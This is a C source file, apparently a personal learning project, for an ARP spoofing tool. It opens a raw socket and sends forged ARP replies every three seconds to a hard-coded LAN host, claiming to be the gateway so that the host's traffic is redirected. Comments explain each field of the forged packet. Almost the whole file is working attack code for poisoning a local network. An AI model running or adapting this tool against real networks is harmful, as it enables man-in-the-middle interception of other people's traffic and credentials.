#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <netinet/ip.h>
#include <linux/if_ether.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <net/ethernet.h>
#include <signal.h>
#include <netpacket/packet.h>
#include <linux/tcp.h>
#include <errno.h>

#define PACKET_SIZE 43
#define ARP_PROTOCOL 0x0806 
#define IPv4_PROTOCOL 0x0800


// Struct for ARP Reply,Read Below For what each Entry mEans
struct arphdr {
    uint16_t hw_type;         
    uint16_t proto_type;      
    uint8_t hw_len;            
    uint8_t proto_len;        
    uint16_t op;               
    uint8_t sender_hw_addr[6]; 
    uint8_t sender_proto_addr[4]; 
    uint8_t target_hw_addr[6]; 
    uint8_t target_proto_addr[4]; 
};

/*
ARP REPLY PACKET STRUCTURE

Layer 1
	Hardware-Type:             16 bits --> Type Of Hardware being used, 1 for ethernet
	Protocol-Type:             16 bits --> Type Of IP Protocol Being used 0x0800 for IPv4
Layer 2
	Hardware-Length:           8  bits --> Specifies the length of the hardware address, usually 6 bytes for MAC Addresses
	Protocol-Length:           8  bits --> Specifies the Length Of the Protocol(IP) Address, Usually 4 Bytes for IPv4
	Operation:                 16 bits --> Specifies Operation We Want, 2 For ARP Reply
Layer 3
	Sender-Hardware-Address:   48 bits --> MAC Address Of the Sender
		if we are making the router think we are the target this will be set to My MAC Address
Layer 4
	Sender-Protocol-Address:   32 bits --> IP Of the Sender
		if we are making the router think we are the target this will be set to My IP
Layer 5
	Target-Hardware-Address:   48 bits --> MAC Address Of the Target
Layer 6
	Target-Protocol-Address:   32 bits --> IP Of the Target

*/

void sig_handle(int sig) {
	printf("[*] Ctrl+C Detected, GoodBye");
	exit(1);
}

int main(int argc, char *argv[])
{
	signal(SIGINT, sig_handle);
	/** 
		Buffer1 Holds the Packet that will Be Sent to the target and make it think we are the router
		Buffer2 Holds the Packet that will be sent to the router and make it then we are the target
	**/
	unsigned char buffer1[sizeof(struct ethhdr) + sizeof(struct arphdr)];
	unsigned char buffer2[sizeof(struct ethhdr) + sizeof(struct arphdr)];

	/**
		Declare 2 Structs And Cast Them to each of the buffers
	**/
	struct ethhdr *ether_header = (struct ethhdr*)buffer1;
	struct arphdr *arp_header = (struct arphdr*)(buffer1 + sizeof(struct ethhdr));

	struct ethhdr *ether_header2 = (struct ethhdr*)buffer2;
	struct arphdr *arp_header2 = (struct arphdr*)(buffer2 + sizeof(struct ethhdr));

	/**
		Hard Coded IP/MACS, Target is My Windows Machine 
	**/
	unsigned char target_ip[4] = {192, 168, 1, 23};
	unsigned char gateway_ip[4] = {192, 168, 1, 1};
	unsigned char my_ip[4] = {192, 168, 1 , 31};

	unsigned char my_mac[6] = {0x00, 0x0c, 0x29, 0xd9, 0x94, 0x21};
	unsigned char target_mac[6] = {0xD0, 0x39, 0x57, 0xE3, 0x80, 0xA9};
	unsigned char router_mac[6] = {0xd0, 0xdb, 0xb7, 0x94, 0xd2, 0x3a};

	int sockfd;
	//struct sockaddr sAddr;

	/**
		struct sockaddr_ll is Used for link layer raw sockets, we can specify the interface and Dest MAC
	**/
	struct sockaddr_ll sa;

	/**
		struct ifreq is used for managing network interfaces, allows us to query, configure ect
	**/
	struct ifreq ifr;
	


	printf("[+] Creating Socket...\n");


	/**
		Create a Raw socket, tell the kernel we want it to do 0 processeIng on the Packets, so we can create the Headers
	**/
	if((sockfd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
		printf("Error: %s\n", strerror(errno));
		printf("[*] Did You Run As Root?");
		return 1;
	}
	printf("[*] Raw Socket Created: %d\n\n", sockfd);

	/**
		Copy the interface we want to send on to the ifreq struct
		So then We can Call ioctl to get the Index Of it
	**/
	strcpy(ifr.ifr_name, "eth0");
	if(ioctl(sockfd, SIOCGIFINDEX, &ifr) < 0) {
		printf("Error: %s\n", strerror(errno));
		return 1;
	}

	printf("[*] Interface: %d\n", ifr.ifr_ifindex);
	

	/** 
		Zero Out the SA Struct
		Then Set the Interface Index to Value we Got From ioctl
		Then Finally Tell the Socket we are working with Raw packets
	**/
	memset(&sa, 0, sizeof(sa));
	sa.sll_ifindex = ifr.ifr_ifindex;
	sa.sll_family = AF_PACKET;

	printf("[+] Creating Ethernet Header For Forged Arp Reply To Target...\n");

	/** 
		Setup The Ethernet Header With
			Source MAC Address
			Destination MAC Address
			Protocol This Packet is Using(0x0806 to tell ARP)
	**/

	memcpy(ether_header->h_dest, target_mac, 6);
	memcpy(ether_header->h_source, my_mac, 6);
	ether_header->h_proto = htons(ARP_PROTOCOL);

	printf("[*] Ethernet Header Created!\n\n");


	/**
		Finally We Create the ARP Reply Packet
	**/

	printf("[+] Creating ARP Reply Payload...\n");
	arp_header->hw_type = htons(1);
	arp_header->proto_type = htons(IPv4_PROTOCOL);
	arp_header->hw_len = 6;
	arp_header->proto_len = 4;
	arp_header->op = htons(2);
	memcpy(arp_header->sender_hw_addr, my_mac, 6);
	memcpy(arp_header->sender_proto_addr, gateway_ip, 4);
	memcpy(arp_header->target_hw_addr, target_mac, 6);
	memcpy(arp_header->target_proto_addr, target_ip, 4);
	printf("[*] Forged ARP Reply Created!\n[+] Sending Packet Now\n\n");

	/**
		COntinuasly Send the Packets So the ARP Entrys Dont get OverWritten
	**/
	while(1) {
		if(sendto(sockfd, buffer1, sizeof(buffer1), 0, (struct sockaddr*)&sa, sizeof(sa)) < 0) {
			printf("[-] Error: %s\n", strerror(errno));
			return 1;
		}
		printf("[*] Packet Sent!\n");
		sleep(3);
	}
	

	close(sockfd);



	return 0;
}
